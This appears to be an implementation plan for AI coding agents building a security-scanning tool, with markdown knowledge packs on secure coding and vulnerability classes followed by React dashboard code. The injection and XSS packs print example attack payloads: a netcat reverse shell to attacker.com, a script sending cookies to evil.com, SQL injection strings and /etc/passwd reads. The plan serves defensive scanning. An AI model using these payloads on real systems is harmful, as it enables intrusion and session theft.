# Argus Phase 1 — Skills & Dashboard Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 8 Phase 1 skill files and the React dashboard with Findings, Live Runs (SSE), Cost & Usage, and Pipeline (read-only) tabs.

**Architecture:** Skills are static markdown files — no tests, no build step. The dashboard is a Vite + React + TypeScript SPA that calls the FastAPI backend. The Live Runs tab subscribes to the SSE stream. No UI component imports from Python code.

**Tech Stack:** TypeScript 5, React 18, Vite 5, React Flow (pipeline view), Recharts (cost charts), TanStack Query v5 (data fetching), Tailwind CSS.

## Global Constraints

- All constraints from prior plans apply
- Dashboard imports only from `@argus/api-client` (manual typed client) and `@argus/types` — never from Python packages
- No hardcoded API URLs — use `VITE_API_BASE_URL` env var (default `http://localhost:8000`)
- Tailwind only — no external component library in Phase 1

---

### Task 17: Phase 1 skills

**Files (all new markdown files):**
- Create: `skills/languages/python/SKILL.md`
- Create: `skills/languages/javascript-typescript/SKILL.md`
- Create: `skills/vuln-classes/injection/SKILL.md`
- Create: `skills/vuln-classes/xss/SKILL.md`
- Create: `skills/vuln-classes/secrets-exposure/SKILL.md`
- Create: `skills/tools/semgrep-tool/SKILL.md`
- Create: `skills/tools/trufflehog-tool/SKILL.md`
- Create: `skills/standards/owasp-top-10/SKILL.md`

No test cycle — skills are knowledge packs, not executable code.

- [ ] **Step 1: Create skills/languages/python/SKILL.md**

```markdown
---
name: python
description: Secure coding patterns, dangerous APIs, and fix patterns for Python
version: 1.0.0
family: languages
tools_allowed: [semgrep, bandit]
---

# Python Secure Coding

## Dangerous sinks
- `exec()`, `eval()`, `compile()` with user input → RCE
- `subprocess.run/Popen` with `shell=True` and user input → command injection
- `os.system()` with user input → command injection
- `open(user_input)` without path normalization → path traversal
- `pickle.loads()`, `yaml.load()` without Loader → deserialization RCE
- String-formatted SQL queries → SQL injection
- `render_template_string(user_input)` → SSTI

## Safe alternatives
- SQL: use parameterized queries `cursor.execute("SELECT ... WHERE x = ?", (val,))`
- Subprocess: `subprocess.run(["cmd", arg], shell=False)`
- File paths: `pathlib.Path(base).joinpath(user_input).resolve()` then assert starts with base
- Deserialization: `json.loads()` instead of pickle; `yaml.safe_load()` instead of `yaml.load()`
- Templates: pass data as context variables, never interpolate into template strings

## Attacker entry points in Python web apps
- Flask/Django request parameters: `request.args`, `request.form`, `request.json`
- File uploads: `request.files`
- HTTP headers: `request.headers`
- URL path segments: `<variable>` in Flask routes, `kwargs` in Django views

## Fix validation checklist
- [ ] Input validated or sanitized before reaching sink
- [ ] ORM or parameterized query used for all DB access
- [ ] Path traversal check: resolved path starts with expected base
- [ ] Subprocess uses list form, not string with shell=True
```

- [ ] **Step 2: Create skills/languages/javascript-typescript/SKILL.md**

```markdown
---
name: javascript-typescript
description: Secure coding patterns for JavaScript and TypeScript (Node.js and browser)
version: 1.0.0
family: languages
tools_allowed: [semgrep, eslint-security]
---

# JavaScript / TypeScript Secure Coding

## Dangerous sinks
- `innerHTML`, `outerHTML`, `document.write()` with user input → XSS
- `eval()`, `new Function(userInput)` → RCE / code injection
- `child_process.exec(userInput)` → command injection
- Template literals in SQL: `` `SELECT * WHERE id = ${id}` `` → SQL injection
- `require(userInput)`, `import(userInput)` → arbitrary code load
- `res.redirect(req.query.url)` without allowlist → open redirect

## Safe alternatives
- DOM: `element.textContent = userInput` (never innerHTML with user data)
- SQL: use parameterized queries or ORM methods
- Shell: `child_process.execFile('cmd', [arg])` — array form, no shell
- Redirects: validate against an allowlist of allowed domains

## Prototype pollution signals
- `obj[userKey] = userValue` where key comes from user input
- `JSON.parse` result assigned to object properties without sanitization
- lodash `merge`, `set`, `zipObjectDeep` with user-controlled keys

## Fix validation checklist
- [ ] No innerHTML with user-controlled content
- [ ] All SQL uses parameterized queries or ORM
- [ ] eval() / new Function() replaced with safe alternative
- [ ] open redirect validates against allowlist
```

- [ ] **Step 3: Create skills/vuln-classes/injection/SKILL.md**

```markdown
---
name: injection
description: SQL, command, LDAP, and template injection — detection, attack patterns, and fixes
version: 1.0.0
family: vuln-classes
tools_allowed: [semgrep]
---

# Injection (CWE-89, CWE-78, CWE-917)

## Attacker mindset
The attacker controls a string that is interpreted as code by a downstream interpreter.
Target: exfiltrate data, bypass auth, execute OS commands, pivot to internal systems.

## SQL injection attack patterns
- Auth bypass: `' OR '1'='1' --`
- Data exfiltration: `' UNION SELECT username, password FROM users --`
- Blind boolean: `' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1) = 'a' --`
- Time-based blind: `'; WAITFOR DELAY '0:0:5' --`

## Command injection attack patterns
- Chaining: `; cat /etc/passwd`
- Subshell: `$(cat /etc/passwd)`
- Piping: `| nc attacker.com 4444 -e /bin/sh`

## Detection signals
- String concatenation/interpolation feeding a DB execute call
- `shell=True` in subprocess with any variable input
- `os.system()`, `os.popen()` with variable input
- Raw query strings in ORM `.raw()` or `.execute()` calls

## Fix pattern
Replace string interpolation with parameterized binding:
- Python: `cursor.execute("SELECT ... WHERE id = %s", (user_id,))`
- Node/pg: `client.query("SELECT ... WHERE id = $1", [userId])`
- Java/JDBC: `PreparedStatement` with `?` placeholders

## Fix validation
Run the scanner again after fix — zero injection findings on the changed file.
Attempt the auth bypass payload manually if a test endpoint exists.
```

- [ ] **Step 4: Create skills/vuln-classes/xss/SKILL.md**

```markdown
---
name: xss
description: Cross-site scripting — reflected, stored, DOM-based. Detection, payloads, fixes.
version: 1.0.0
family: vuln-classes
tools_allowed: [semgrep]
---

# Cross-Site Scripting — CWE-79

## Attacker mindset
The attacker injects a script that runs in the victim's browser under the application's origin.
Goals: steal session cookies, perform actions as the victim, keylog, redirect to phishing.

## Payload patterns
- Basic: `<script>document.location='https://evil.com/?c='+document.cookie</script>`
- Attribute injection: `" onmouseover="alert(1)`
- Without angle brackets: `javascript:alert(1)` in href
- CSP bypass: `<script src="https://attacker.com/x.js"></script>` if CSP allows CDN wildcards

## Detection signals
- `innerHTML`, `outerHTML`, `document.write()` receiving request parameters
- Python: `f"<div>{request.args['q']}</div>"` — raw interpolation into HTML
- Jinja2 with `| safe` filter on user input
- React: `dangerouslySetInnerHTML` with user content

## Fix pattern
- Use framework output encoding: Jinja2 auto-escapes by default — never use `| safe` on user input
- React: use `{userContent}` as text (safe); never `dangerouslySetInnerHTML`
- Node/Express: use `res.json()` for API responses; for HTML use a templating engine with auto-escape
- Content-Security-Policy header as defense in depth: `default-src 'self'`

## Fix validation
Attempt `<script>alert(1)</script>` in the affected input field.
Check that the output is HTML-entity-encoded in the response.
```

- [ ] **Step 5: Create skills/vuln-classes/secrets-exposure/SKILL.md**

```markdown
---
name: secrets-exposure
description: Hardcoded credentials, secrets in config and history — detection and remediation
version: 1.0.0
family: vuln-classes
tools_allowed: [trufflehog, semgrep]
---

# Secrets Exposure — CWE-798, CWE-312

## Attacker mindset
Attacker clones the repo (public or via leaked credentials), runs trufflehog or grep,
and extracts API keys in minutes. Keys in git history survive even after the file is edited.

## What to look for
- Strings matching provider key patterns in source files (sk-ant-, sk-proj-, ghp_, AIza...)
- Keys assigned to variables named: api_key, secret, token, password, credentials
- .env files committed to git
- Keys in CI/CD YAML files (GitHub Actions secrets misconfiguration)
- Keys in test fixtures or mock data

## Remediation steps (in order)
1. **Rotate the secret immediately** — assume it is compromised
2. Remove from the current file
3. Remove from git history: `git filter-repo --path <file> --invert-paths`
   or BFG Repo Cleaner for large repos
4. Move to environment variable or secrets manager (Vault, AWS SSM, GitHub Secrets)
5. Add the pattern to pre-commit hooks (detect-secrets, gitleaks)

## Platform handling
Argus stores only a fingerprint (SHA-256) and location — never the raw secret value.
The raw value is redacted before any log, database write, or LLM prompt.

## Fix validation
After rotation: confirm the old key returns 401/403 from the provider.
After history rewrite: `git log -S "old-key-value"` returns no results.
```

- [ ] **Step 6: Create skills/tools/semgrep-tool/SKILL.md**

```markdown
---
name: semgrep-tool
description: How to invoke Semgrep, parse its SARIF output, and map results to Findings
version: 1.0.0
family: tools
tools_allowed: []
---

# Semgrep Tool Wrapper

## Invocation
```bash
semgrep scan \
  --config auto \
  --sarif \
  --output results.sarif \
  --timeout 120 \
  --no-git-ignore \
  /path/to/repo
```

Exit codes: 0 = no findings, 1 = findings present, 2+ = error.

## SARIF output structure
- `runs[0].tool.driver.rules[]` — rule metadata (id, name, tags including CWE/OWASP)
- `runs[0].results[]` — each result has ruleId, level, locations, message

## Level → Severity mapping
- error → high (upgrade to critical if message contains "critical")
- warning → medium
- note → low
- none → info

## CWE extraction
Rules carry tags like `["CWE-89", "OWASP-A03:2021"]`.
Extract the first `CWE-*` tag as `cwe`. Extract first `OWASP-*` as `owasp_category`.

## Performance notes
`--config auto` downloads rules on first run. Cache `~/.semgrep/` across CI runs.
For large repos (>10k files), add `--max-target-bytes 1000000` to skip binary files.
```

- [ ] **Step 7: Create skills/tools/trufflehog-tool/SKILL.md**

```markdown
---
name: trufflehog-tool
description: How to invoke TruffleHog, parse JSON output, and handle secrets safely
version: 1.0.0
family: tools
tools_allowed: []
---

# TruffleHog Tool Wrapper

## Invocation (filesystem)
```bash
trufflehog filesystem \
  --directory /path/to/repo \
  --json \
  --no-update
```

## Invocation (git history)
```bash
trufflehog git \
  file:///path/to/repo \
  --json \
  --no-update
```

## Output format
One JSON object per line (ndjson). Key fields:
- `DetectorName` — type of secret (e.g., "Anthropic", "GitHub")
- `Raw` / `RawV2` — the actual secret value — **REDACT IMMEDIATELY, never persist**
- `Verified` — boolean, whether TruffleHog confirmed the secret is live
- `SourceMetadata.Data.Filesystem.file` / `.line` — location

## Handling raw values
1. Extract `Raw` or `RawV2` to compute `fingerprint = sha256(raw)`
2. Discard `Raw`/`RawV2` immediately
3. Store only: fingerprint, DetectorName, file path, line number

## Severity
All secrets findings are `critical` (CWE-798, OWASP A07:2021).
`Verified=true` means the key is confirmed live — treat as incident, not just a finding.
```

- [ ] **Step 8: Create skills/standards/owasp-top-10/SKILL.md**

```markdown
---
name: owasp-top-10
description: OWASP Top 10 2021 category codes, CWE mappings, and detection signals
version: 1.0.0
family: standards
tools_allowed: []
---

# OWASP Top 10 (2021) Reference

| Code | Category | Key CWEs | Argus finding types |
|------|----------|----------|---------------------|
| A01:2021 | Broken Access Control | CWE-22, CWE-284, CWE-285, CWE-639 | path traversal, missing authz checks, IDOR |
| A02:2021 | Cryptographic Failures | CWE-311, CWE-326, CWE-327 | weak crypto, unencrypted sensitive data |
| A03:2021 | Injection | CWE-89, CWE-78, CWE-79 | SQL injection, command injection, XSS |
| A04:2021 | Insecure Design | CWE-73, CWE-183 | missing rate limiting, weak password policy |
| A05:2021 | Security Misconfiguration | CWE-16, CWE-611 | debug mode on, permissive CORS, XXE |
| A06:2021 | Vulnerable Components | CWE-1035, CWE-937 | SCA findings, outdated dependencies |
| A07:2021 | Auth & Session Failures | CWE-287, CWE-798 | hardcoded creds, broken session management |
| A08:2021 | Software & Data Integrity | CWE-502, CWE-829 | deserialization, unsigned updates |
| A09:2021 | Logging & Monitoring Failures | CWE-778, CWE-117 | missing audit logs, log injection |
| A10:2021 | SSRF | CWE-918 | unvalidated URL fetch with user input |

## Mapping rule
When a finding has a CWE but no OWASP category, use this table to derive one.
Multiple CWEs may map to the same OWASP category — use the most specific.
```

- [ ] **Step 9: Commit all skills**

```bash
git add skills/
git commit -m "feat: Phase 1 skills — languages, vuln-classes, tools, standards"
```

---

### Task 18: Dashboard scaffold + Findings tab

**Files:**
- Create: `surfaces/dashboard/package.json`
- Create: `surfaces/dashboard/vite.config.ts`
- Create: `surfaces/dashboard/tsconfig.json`
- Create: `surfaces/dashboard/index.html`
- Create: `surfaces/dashboard/src/main.tsx`
- Create: `surfaces/dashboard/src/App.tsx`
- Create: `surfaces/dashboard/src/api/client.ts`
- Create: `surfaces/dashboard/src/pages/findings/FindingsPage.tsx`
- Create: `surfaces/dashboard/src/pages/findings/FindingDetail.tsx`
- Create: `surfaces/dashboard/src/components/Layout.tsx`
- Create: `surfaces/dashboard/src/components/Nav.tsx`
- Create: `surfaces/dashboard/tailwind.config.js`
- Create: `surfaces/dashboard/postcss.config.js`

- [ ] **Step 1: Initialize npm package**

```bash
cd surfaces/dashboard
npm create vite@latest . -- --template react-ts
npm install
npm install @tanstack/react-query axios tailwindcss postcss autoprefixer
npm install -D @types/react @types/react-dom
npx tailwindcss init -p
```

- [ ] **Step 2: Configure tailwind.config.js**

```js
// surfaces/dashboard/tailwind.config.js
export default {
  content: ["./index.html", "./src/**/*.{ts,tsx}"],
  theme: { extend: {} },
  plugins: [],
}
```

- [ ] **Step 3: Add Tailwind to src/index.css**

```css
/* surfaces/dashboard/src/index.css */
@tailwind base;
@tailwind components;
@tailwind utilities;
```

- [ ] **Step 4: Create src/api/client.ts**

```typescript
// surfaces/dashboard/src/api/client.ts
const BASE = import.meta.env.VITE_API_BASE_URL ?? "http://localhost:8000";

async function get<T>(path: string): Promise<T> {
  const res = await fetch(`${BASE}${path}`);
  if (!res.ok) throw new Error(`${res.status} ${res.statusText}`);
  return res.json() as Promise<T>;
}

async function post<T>(path: string, body: unknown): Promise<T> {
  const res = await fetch(`${BASE}${path}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  if (!res.ok) throw new Error(`${res.status} ${res.statusText}`);
  return res.json() as Promise<T>;
}

export interface FindingDTO {
  id: string;
  rule_id: string;
  source_tool: string;
  cwe: string | null;
  owasp_category: string | null;
  severity: "critical" | "high" | "medium" | "low" | "info";
  confidence: number;
  exploit_likelihood: number;
  reachability: string | null;
  location: { file: string; line_start: number; line_end: number; snippet?: string };
  status: string;
  explanation: string | null;
  attack_scenario?: string;
  priority_score?: number;
}

export interface ScanDTO {
  id: string;
  target_ref: string;
  status: string;
  mode: string;
  cost_usd: number;
  started_at: string | null;
}

export interface CostEntryDTO {
  id: string;
  scope_type: string;
  scope_id: string;
  tokens_in: number;
  tokens_out: number;
  tier: string;
  provider: string;
  model_id: string;
  cost_usd: number;
  timestamp: string;
}

export const api = {
  listScans: () => get<ScanDTO[]>("/api/v1/scans/"),
  triggerScan: (body: { target_ref: string; mode?: string }) =>
    post<{ scan_id: string }>("/api/v1/scans/", body),
  getScanFindings: (scanId: string) =>
    get<FindingDTO[]>(`/api/v1/scans/${scanId}/findings`),
  getCostLedger: () => get<CostEntryDTO[]>("/api/v1/cost/ledger"),
  getCostSummary: () => get<{ total_cost_usd: number; total_tokens_in: number; total_calls: number }>("/api/v1/cost/summary"),
};
```

- [ ] **Step 5: Create src/components/Nav.tsx**

```tsx
// surfaces/dashboard/src/components/Nav.tsx
import { NavLink } from "react-router-dom";

const links = [
  { to: "/findings", label: "Findings" },
  { to: "/runs", label: "Live Runs" },
  { to: "/cost", label: "Cost & Usage" },
  { to: "/pipeline", label: "Pipeline" },
];

export function Nav() {
  return (
    <nav className="w-56 min-h-screen bg-gray-900 text-gray-200 flex flex-col py-8 px-4 gap-1">
      <span className="text-xl font-bold text-white mb-8 tracking-tight">Argus</span>
      {links.map((l) => (
        <NavLink
          key={l.to}
          to={l.to}
          className={({ isActive }) =>
            `px-3 py-2 rounded text-sm font-medium transition-colors ${
              isActive ? "bg-indigo-600 text-white" : "hover:bg-gray-800 text-gray-400"
            }`
          }
        >
          {l.label}
        </NavLink>
      ))}
    </nav>
  );
}
```

- [ ] **Step 6: Create src/components/Layout.tsx**

```tsx
// surfaces/dashboard/src/components/Layout.tsx
import { Outlet } from "react-router-dom";
import { Nav } from "./Nav";

export function Layout() {
  return (
    <div className="flex min-h-screen bg-gray-950 text-gray-100">
      <Nav />
      <main className="flex-1 p-8 overflow-auto">
        <Outlet />
      </main>
    </div>
  );
}
```

- [ ] **Step 7: Create src/pages/findings/FindingsPage.tsx**

```tsx
// surfaces/dashboard/src/pages/findings/FindingsPage.tsx
import { useState } from "react";
import { useQuery } from "@tanstack/react-query";
import { api, FindingDTO, ScanDTO } from "../../api/client";
import { FindingDetail } from "./FindingDetail";

const SEVERITY_COLOR: Record<string, string> = {
  critical: "bg-red-600",
  high: "bg-orange-500",
  medium: "bg-yellow-500",
  low: "bg-blue-500",
  info: "bg-gray-500",
};

export function FindingsPage() {
  const [selectedScanId, setSelectedScanId] = useState<string | null>(null);
  const [selectedFinding, setSelectedFinding] = useState<FindingDTO | null>(null);

  const { data: scans } = useQuery({ queryKey: ["scans"], queryFn: api.listScans });
  const { data: findings } = useQuery({
    queryKey: ["findings", selectedScanId],
    queryFn: () => api.getScanFindings(selectedScanId!),
    enabled: !!selectedScanId,
  });

  return (
    <div className="flex gap-6 h-full">
      <div className="flex-1 flex flex-col gap-4">
        <div className="flex items-center justify-between">
          <h1 className="text-2xl font-bold">Findings</h1>
          <select
            className="bg-gray-800 border border-gray-700 rounded px-3 py-1.5 text-sm"
            value={selectedScanId ?? ""}
            onChange={(e) => { setSelectedScanId(e.target.value); setSelectedFinding(null); }}
          >
            <option value="">Select a scan…</option>
            {scans?.map((s) => (
              <option key={s.id} value={s.id}>
                {s.target_ref} — {s.status} — ${s.cost_usd.toFixed(3)}
              </option>
            ))}
          </select>
        </div>

        {findings && findings.length === 0 && (
          <p className="text-gray-500">No findings for this scan.</p>
        )}

        <div className="flex flex-col gap-2">
          {findings?.map((f) => (
            <button
              key={f.id}
              onClick={() => setSelectedFinding(f)}
              className={`text-left px-4 py-3 rounded-lg border transition-colors ${
                selectedFinding?.id === f.id
                  ? "border-indigo-500 bg-gray-800"
                  : "border-gray-700 bg-gray-900 hover:border-gray-500"
              }`}
            >
              <div className="flex items-center gap-3">
                <span className={`${SEVERITY_COLOR[f.severity]} text-white text-xs font-bold px-2 py-0.5 rounded uppercase`}>
                  {f.severity}
                </span>
                <span className="font-mono text-sm text-gray-300">{f.rule_id}</span>
                <span className="text-gray-500 text-sm">{f.location.file}:{f.location.line_start}</span>
                {f.cwe && <span className="text-gray-600 text-xs">{f.cwe}</span>}
                <span className="ml-auto text-gray-600 text-xs">
                  score {f.priority_score?.toFixed(1) ?? "—"}
                </span>
              </div>
              {f.attack_scenario && (
                <p className="mt-1 text-xs text-gray-400 truncate">{f.attack_scenario}</p>
              )}
            </button>
          ))}
        </div>
      </div>

      {selectedFinding && (
        <FindingDetail finding={selectedFinding} onClose={() => setSelectedFinding(null)} />
      )}
    </div>
  );
}
```

- [ ] **Step 8: Create src/pages/findings/FindingDetail.tsx**

```tsx
// surfaces/dashboard/src/pages/findings/FindingDetail.tsx
import { FindingDTO } from "../../api/client";

interface Props { finding: FindingDTO; onClose: () => void; }

export function FindingDetail({ finding, onClose }: Props) {
  return (
    <div className="w-96 bg-gray-900 border border-gray-700 rounded-xl p-6 flex flex-col gap-4 overflow-auto">
      <div className="flex justify-between items-start">
        <h2 className="font-mono text-sm font-bold text-gray-200 break-all">{finding.rule_id}</h2>
        <button onClick={onClose} className="text-gray-600 hover:text-gray-300 text-xl leading-none">×</button>
      </div>

      <div className="flex flex-wrap gap-2 text-xs">
        <Tag label={finding.severity.toUpperCase()} color="bg-orange-600" />
        {finding.cwe && <Tag label={finding.cwe} color="bg-gray-700" />}
        {finding.owasp_category && <Tag label={`OWASP ${finding.owasp_category}`} color="bg-gray-700" />}
        <Tag label={`conf ${(finding.confidence * 100).toFixed(0)}%`} color="bg-gray-800" />
        <Tag label={`exploit ${(finding.exploit_likelihood * 100).toFixed(0)}%`} color="bg-gray-800" />
      </div>

      <div>
        <h3 className="text-xs font-semibold text-gray-500 uppercase tracking-wide mb-1">Location</h3>
        <p className="font-mono text-sm text-indigo-400">{finding.location.file}:{finding.location.line_start}</p>
        {finding.location.snippet && (
          <pre className="mt-2 p-3 bg-gray-800 rounded text-xs text-gray-300 overflow-x-auto whitespace-pre-wrap">
            {finding.location.snippet}
          </pre>
        )}
      </div>

      {finding.reachability && (
        <div>
          <h3 className="text-xs font-semibold text-gray-500 uppercase tracking-wide mb-1">Reachability</h3>
          <p className="text-sm text-gray-300">{finding.reachability}</p>
        </div>
      )}

      {finding.attack_scenario && (
        <div>
          <h3 className="text-xs font-semibold text-red-400 uppercase tracking-wide mb-1">⚠ Attack Scenario</h3>
          <p className="text-sm text-gray-200 leading-relaxed">{finding.attack_scenario}</p>
        </div>
      )}

      {finding.explanation && (
        <div>
          <h3 className="text-xs font-semibold text-gray-500 uppercase tracking-wide mb-1">Explanation & Fix</h3>
          <p className="text-sm text-gray-300 leading-relaxed">{finding.explanation}</p>
        </div>
      )}
    </div>
  );
}

function Tag({ label, color }: { label: string; color: string }) {
  return <span className={`${color} text-white px-2 py-0.5 rounded text-xs font-medium`}>{label}</span>;
}
```

- [ ] **Step 9: Create App.tsx with router**

```bash
npm install react-router-dom
```

```tsx
// surfaces/dashboard/src/App.tsx
import { BrowserRouter, Routes, Route, Navigate } from "react-router-dom";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { Layout } from "./components/Layout";
import { FindingsPage } from "./pages/findings/FindingsPage";

const qc = new QueryClient();

export default function App() {
  return (
    <QueryClientProvider client={qc}>
      <BrowserRouter>
        <Routes>
          <Route element={<Layout />}>
            <Route index element={<Navigate to="/findings" replace />} />
            <Route path="/findings" element={<FindingsPage />} />
            <Route path="/runs" element={<div className="text-gray-500">Live Runs — Task 19</div>} />
            <Route path="/cost" element={<div className="text-gray-500">Cost & Usage — Task 20</div>} />
            <Route path="/pipeline" element={<div className="text-gray-500">Pipeline — Task 21</div>} />
          </Route>
        </Routes>
      </BrowserRouter>
    </QueryClientProvider>
  );
}
```

- [ ] **Step 10: Create src/main.tsx and index.html**

```tsx
// surfaces/dashboard/src/main.tsx
import React from "react";
import ReactDOM from "react-dom/client";
import "./index.css";
import App from "./App";

ReactDOM.createRoot(document.getElementById("root")!).render(
  <React.StrictMode><App /></React.StrictMode>
);
```

```html
<!-- surfaces/dashboard/index.html -->
<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Argus</title>
  </head>
  <body>
    <div id="root"></div>
    <script type="module" src="/src/main.tsx"></script>
  </body>
</html>
```

- [ ] **Step 11: Verify dashboard builds**

```bash
cd surfaces/dashboard
npm run build
```

Expected: `dist/` created, no TypeScript errors.

- [ ] **Step 12: Commit**

```bash
cd ../..
git add surfaces/dashboard/
git commit -m "feat: dashboard scaffold + Findings tab with attack scenario display"
```

---

### Task 19: Live Runs tab (SSE)

**Files:**
- Create: `surfaces/dashboard/src/hooks/useScanEvents.ts`
- Create: `surfaces/dashboard/src/pages/runs/RunsPage.tsx`
- Create: `surfaces/dashboard/src/pages/runs/RunTrace.tsx`
- Create: `surfaces/dashboard/src/pages/runs/BudgetGauge.tsx`
- Modify: `surfaces/dashboard/src/App.tsx` (wire RunsPage)

- [ ] **Step 1: Create src/hooks/useScanEvents.ts**

```typescript
// surfaces/dashboard/src/hooks/useScanEvents.ts
import { useEffect, useRef, useState } from "react";

export interface ScanEvent {
  event: string;
  agent?: string;
  cost_usd?: number;
  model_id?: string;
  tokens_in?: number;
  tokens_out?: number;
  total_cost_usd?: number;
  finding_count?: number;
  error?: string;
  skipped?: boolean;
  [key: string]: unknown;
}

const BASE = import.meta.env.VITE_API_BASE_URL ?? "http://localhost:8000";

export function useScanEvents(scanId: string | null) {
  const [events, setEvents] = useState<ScanEvent[]>([]);
  const [connected, setConnected] = useState(false);
  const esRef = useRef<EventSource | null>(null);

  useEffect(() => {
    if (!scanId) return;
    setEvents([]);
    const es = new EventSource(`${BASE}/api/v1/scans/${scanId}/events`);
    esRef.current = es;
    setConnected(true);

    es.onmessage = (e) => {
      try {
        const parsed: ScanEvent = JSON.parse(e.data);
        setEvents((prev) => [...prev, parsed]);
        if (parsed.event === "scan_completed" || parsed.event === "scan_failed") {
          es.close();
          setConnected(false);
        }
      } catch {}
    };

    es.onerror = () => { es.close(); setConnected(false); };

    return () => { es.close(); setConnected(false); };
  }, [scanId]);

  return { events, connected };
}
```

- [ ] **Step 2: Create src/pages/runs/BudgetGauge.tsx**

```tsx
// surfaces/dashboard/src/pages/runs/BudgetGauge.tsx
interface Props { usedUsd: number; limitUsd?: number; }

export function BudgetGauge({ usedUsd, limitUsd = 5 }: Props) {
  const pct = Math.min((usedUsd / limitUsd) * 100, 100);
  const color = pct >= 80 ? "bg-red-500" : pct >= 50 ? "bg-yellow-500" : "bg-emerald-500";
  return (
    <div className="bg-gray-800 rounded-lg p-4 min-w-[180px]">
      <p className="text-xs text-gray-400 mb-1 font-semibold uppercase tracking-wide">Budget</p>
      <p className="text-lg font-mono text-white">${usedUsd.toFixed(3)} <span className="text-gray-500 text-sm">/ ${limitUsd}</span></p>
      <div className="mt-2 h-2 bg-gray-700 rounded-full overflow-hidden">
        <div className={`h-full ${color} rounded-full transition-all`} style={{ width: `${pct}%` }} />
      </div>
    </div>
  );
}
```

- [ ] **Step 3: Create src/pages/runs/RunTrace.tsx**

```tsx
// surfaces/dashboard/src/pages/runs/RunTrace.tsx
import { ScanEvent } from "../../hooks/useScanEvents";

interface Props { events: ScanEvent[]; }

export function RunTrace({ events }: Props) {
  const agentRows = new Map<string, { started: boolean; completed: boolean; cost: number; model?: string; skipped: boolean }>();

  for (const e of events) {
    if (e.event === "agent_started" && e.agent) {
      agentRows.set(e.agent, { started: true, completed: false, cost: 0, skipped: false });
    }
    if (e.event === "agent_completed" && e.agent) {
      const prev = agentRows.get(e.agent) ?? { started: true, completed: false, cost: 0, skipped: false };
      agentRows.set(e.agent, { ...prev, completed: true, cost: e.cost_usd ?? 0, skipped: !!e.skipped });
    }
    if (e.event === "llm_call" && e.agent) {
      const prev = agentRows.get(e.agent) ?? { started: true, completed: false, cost: 0, skipped: false };
      agentRows.set(e.agent, { ...prev, model: e.model_id, cost: prev.cost + (e.cost_usd ?? 0) });
    }
  }

  const llmCalls = events.filter((e) => e.event === "llm_call");
  const budgetWarning = events.find((e) => e.event === "budget_warning");

  return (
    <div className="flex-1">
      <div className="bg-gray-900 border border-gray-700 rounded-xl overflow-hidden">
        <div className="px-4 py-3 border-b border-gray-700 text-xs font-semibold text-gray-400 uppercase tracking-wide grid grid-cols-4 gap-4">
          <span>Agent</span><span>Status</span><span>Model</span><span>Cost</span>
        </div>
        {[...agentRows.entries()].map(([agent, info]) => (
          <div key={agent} className="px-4 py-3 border-b border-gray-800 grid grid-cols-4 gap-4 text-sm">
            <span className="font-mono text-indigo-400">{agent}</span>
            <span>
              {info.skipped ? "⏭ skipped" : info.completed ? "✓ done" : info.started ? "▶ running…" : "· queued"}
            </span>
            <span className="text-gray-400">{info.model ?? "—"}</span>
            <span className="font-mono">{info.cost > 0 ? `$${info.cost.toFixed(4)}` : "—"}</span>
          </div>
        ))}
        {agentRows.size === 0 && (
          <div className="px-4 py-8 text-center text-gray-600 text-sm">Waiting for scan events…</div>
        )}
      </div>

      {llmCalls.length > 0 && (
        <div className="mt-4">
          <h3 className="text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Model Router Log</h3>
          <div className="bg-gray-900 border border-gray-700 rounded-xl overflow-hidden">
            {llmCalls.slice(-20).map((e, i) => (
              <div key={i} className="px-4 py-2 border-b border-gray-800 text-xs font-mono text-gray-400 flex gap-4">
                <span className="text-indigo-400">{e.agent}</span>
                <span className="text-white">→ {e.model_id}</span>
                <span>{e.tokens_in?.toLocaleString()} in / {e.tokens_out?.toLocaleString()} out</span>
                <span className="text-emerald-400">${e.cost_usd?.toFixed(4)}</span>
              </div>
            ))}
          </div>
        </div>
      )}

      {budgetWarning && (
        <div className="mt-4 px-4 py-3 bg-yellow-900/40 border border-yellow-700 rounded-lg text-sm text-yellow-300">
          ⚠ Budget soft limit reached — {budgetWarning.used_pct}% used (${budgetWarning.used_usd?.toFixed(2)})
        </div>
      )}
    </div>
  );
}
```

- [ ] **Step 4: Create src/pages/runs/RunsPage.tsx**

```tsx
// surfaces/dashboard/src/pages/runs/RunsPage.tsx
import { useState } from "react";
import { useQuery } from "@tanstack/react-query";
import { api } from "../../api/client";
import { useScanEvents } from "../../hooks/useScanEvents";
import { RunTrace } from "./RunTrace";
import { BudgetGauge } from "./BudgetGauge";

export function RunsPage() {
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const { data: scans } = useQuery({ queryKey: ["scans"], queryFn: api.listScans });
  const { events, connected } = useScanEvents(selectedId);

  const totalCost = events
    .filter((e) => e.event === "llm_call")
    .reduce((s, e) => s + (e.cost_usd ?? 0), 0);

  const modelCounts: Record<string, number> = {};
  events.filter((e) => e.event === "llm_call").forEach((e) => {
    if (e.model_id) modelCounts[e.model_id] = (modelCounts[e.model_id] ?? 0) + 1;
  });

  return (
    <div className="flex flex-col gap-6">
      <div className="flex items-center justify-between">
        <h1 className="text-2xl font-bold">Live Runs</h1>
        <select
          className="bg-gray-800 border border-gray-700 rounded px-3 py-1.5 text-sm"
          value={selectedId ?? ""}
          onChange={(e) => setSelectedId(e.target.value || null)}
        >
          <option value="">Select a scan…</option>
          {scans?.map((s) => (
            <option key={s.id} value={s.id}>{s.target_ref} — {s.status}</option>
          ))}
        </select>
        {connected && <span className="flex items-center gap-1 text-xs text-emerald-400"><span className="w-2 h-2 bg-emerald-400 rounded-full animate-pulse" />live</span>}
      </div>

      <div className="flex gap-4">
        <RunTrace events={events} />
        <div className="flex flex-col gap-4 min-w-[200px]">
          <BudgetGauge usedUsd={totalCost} />
          {Object.entries(modelCounts).length > 0 && (
            <div className="bg-gray-800 rounded-lg p-4">
              <p className="text-xs text-gray-400 mb-2 font-semibold uppercase tracking-wide">Model calls</p>
              {Object.entries(modelCounts).map(([m, c]) => (
                <div key={m} className="flex justify-between text-xs text-gray-300 py-0.5">
